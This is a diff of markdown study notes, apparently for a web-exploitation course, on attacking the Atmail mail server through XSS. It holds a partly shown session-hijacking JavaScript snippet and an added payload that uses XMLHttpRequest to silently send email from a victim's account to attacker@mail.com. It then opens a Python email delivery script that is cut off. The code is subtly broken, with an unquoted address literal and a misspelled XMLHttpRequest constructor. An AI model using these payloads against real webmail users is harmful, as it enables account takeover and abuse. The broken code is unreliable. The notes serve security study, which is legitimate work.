@@ -1,7 +1,7 @@
 # WEB-300: Atmail eMail Server Appliance: from XSS to RCE
 The idea is mailservers can be vulnerable to xss, if you send a payload in the date or subject or body as form of iframe or javascript, you canexploit the vulnerability. Note: 99% of the world use about 4 main mail platforms, with gmail and outlook and yahoo basically accounting for over 90% and protonmail 8%. So, everything explained here is mostly theoretical. All mail servers won't accept iframe and the fields are sanitized. So, the only trick you have is still to trick people out of the mail through links. 
 
-## session hijacking
+# session hijacking
 ```javascript
 function addImage(){
   var img = document.createElement('img');
@@ -12,6 +12,24 @@ function addImage(){
 addImage();
 ```
 
+# session riding
+For this attack let's use XMLHttpRequest. The XHR objects are used to interact with servers. You can retrieve data from a URL without having to do a full page refresh.
+- with burp find which is the request to send out emails 
+### payload to send email using XMLHttpRequest
+The person won't notice of emails sent from their account.
+```javascript
+var email = attacker@mail.com;
+var sub = "whatever";
+var msg = "okayyyy";
+var method = "GET";
+function send_email(){
+  var uri = "/index.php/mail/composemessage/send/tabId/"
+  var para = "?mailTo="+email+"&emailSubject="+sub+"&emailBody="+msg;
+  xhr = new XMLHttpRequests();
+  xhr.open(method,uri+para, true);
+  xhr.send(null);
+}
+```
 ## sending the payload
 ```python
 import smtplib
